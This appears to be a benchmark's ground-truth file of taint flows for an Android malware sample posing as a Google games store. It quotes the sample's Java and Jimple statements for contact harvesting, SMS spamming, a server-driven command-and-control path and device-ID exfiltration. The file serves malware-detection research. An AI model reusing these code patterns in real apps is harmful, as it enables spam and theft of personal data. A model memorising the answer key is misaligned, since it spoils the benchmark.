@@ -1,0 +1,237 @@
+{
+  "fileName": "fakeappstore.apk",
+  "day": "2019-12-20",
+  "findings": [
+    {
+      "source": {
+        "statement": "Cursor cursor = getContentResolver().query(Uri.parse(\"content://com.android.contacts/raw_contacts\"), null, null, null, null);",
+        "methodName": "public void contacts4SMS(String content)",
+        "className": "com.google.games.stores.service.ContactsService",
+        "lineNo": 200,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r4, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "this.smsManager.sendTextMessage(num, null, content, null, null);",
+        "methodName": "private void sendSMS(String num, String content)",
+        "className": "com.google.games.stores.service.ContactsService",
+        "lineNo": 349,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r1, null, $r2, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String id = cursor.getString(cursor.getColumnIndex(\"_id\"));",
+          "methodName": "public void contacts4SMS(String content)",
+          "className": "com.google.games.stores.service.ContactsService",
+          "lineNo": 208,
+          "ID": 1
+        },
+        {
+          "statement": "Cursor datacursor = getContentResolver().query(Uri.parse(database), null, \"raw_contact_id=?\", new String[]{id}, null);",
+          "methodName": "public void contacts4SMS(String content)",
+          "className": "com.google.games.stores.service.ContactsService",
+          "lineNo": 209,
+          "ID": 2
+        },
+        {
+          "statement": "telString = new StringBuilder(String.valueOf(telString)).append(\" \").append(datacursor.getString(datacursor.getColumnIndex(\"data1\"))).toString();",
+          "methodName": "public void contacts4SMS(String content)",
+          "className": "com.google.games.stores.service.ContactsService",
+          "lineNo": 219,
+          "ID": 3
+        },
+        {
+          "statement": "telString = telString.replace(\"-\", \"\").replace(\" \", \"\");",
+          "methodName": "public void contacts4SMS(String content)",
+          "className": "com.google.games.stores.service.ContactsService",
+          "lineNo": 230,
+          "ID": 4
+        },
+        {
+          "statement": "sendSMS(telString, content);",
+          "methodName": "public void contacts4SMS(String content)",
+          "className": "com.google.games.stores.service.ContactsService",
+          "lineNo": 232,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads contacts from the device and spams them with SMS.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "InputStream input = client.execute(post).getEntity().getContent();",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.google.games.stores.util.NetTask",
+        "lineNo": 110,
+        "targetName": "getContent",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = interfaceinvoke $r13.<org.apache.http.HttpEntity: java.io.InputStream getContent()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "this.smsManager.sendTextMessage(num, null, content, null, null);",
+        "methodName": "private void sendSMS(String num, String content)",
+        "className": "com.google.games.stores.service.ContactsService",
+        "lineNo": 349,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r1, null, $r2, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int len = input.read(buffer);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.games.stores.util.NetTask",
+          "lineNo": 115,
+          "ID": 1
+        },
+        {
+          "statement": "output.write(buffer, 0, len);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.games.stores.util.NetTask",
+          "lineNo": 116,
+          "ID": 2
+        },
+        {
+          "statement": "return output.toString();",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.games.stores.util.NetTask",
+          "lineNo": 119,
+          "ID": 3
+        },
+        {
+          "statement": "JSONObject contacts = (JSONObject) new JSONTokener(result).nextValue();",
+          "methodName": "public void afterReturnService(String result)",
+          "className": "com.google.games.stores.service.ContactsService.AnonymousClass3",
+          "lineNo": 261,
+          "ID": 4
+        },
+        {
+          "statement": "String msg = contacts.optString(\"title\");",
+          "methodName": "public void afterReturnService(String result)",
+          "className": "com.google.games.stores.service.ContactsService.AnonymousClass3",
+          "lineNo": 263,
+          "ID": 5
+        },
+        {
+          "statement": "ContactsService.this.db4SMS(number, msg);",
+          "methodName": "public void afterReturnService(String result)",
+          "className": "com.google.games.stores.service.ContactsService.AnonymousClass3",
+          "lineNo": 276,
+          "ID": 6
+        },
+        {
+          "statement": "sendSMS(telString, content);",
+          "methodName": "public void db4SMS(List<String> number, String content)",
+          "className": "com.google.games.stores.service.ContactsService",
+          "lineNo": 304,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "implicitFlows": true,
+        "partialFlow": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicous flow reads a message from an HTTP Server and sends a SMS to the retreived numbers (command and control).",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return telMgr.getDeviceId();",
+        "methodName": "public static String getDevice(Context context)",
+        "className": "com.google.games.stores.util.GeneralUtil",
+        "lineNo": 47,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "InputStream input = client.execute(post).getEntity().getContent();",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.google.games.stores.util.NetTask",
+        "lineNo": 110,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r12 = interfaceinvoke $r3.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "}.execute(new String[]{this.CONNECT_SERVER + Config.ADD_DEVICE_URL, Config.ADD, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), GeneralUtil.getOperator(this), \"1\", bk_name, \"-\", \"1\"});",
+          "methodName": "public void afterReturnService(String result)",
+          "className": "com.google.games.stores.service.MessageService.AnonymousClass2",
+          "lineNo": -1,
+          "ID": 1
+        },
+        {
+          "statement": "ps.add(new BasicNameValuePair(\"device\", params[2]));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.games.stores.util.NetTask",
+          "lineNo": 41,
+          "ID": 2
+        },
+        {
+          "statement": "ps.add(new BasicNameValuePair(\"ph\", params[3]));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.games.stores.util.NetTask",
+          "lineNo": 44,
+          "ID": 3
+        },
+        {
+          "statement": "post.setEntity(new UrlEncodedFormEntity(ps));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.games.stores.util.NetTask",
+          "lineNo": 106,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow leaks the device id to an HTTP Server.",
+      "isNegative": false
+    }
+  ]
+}
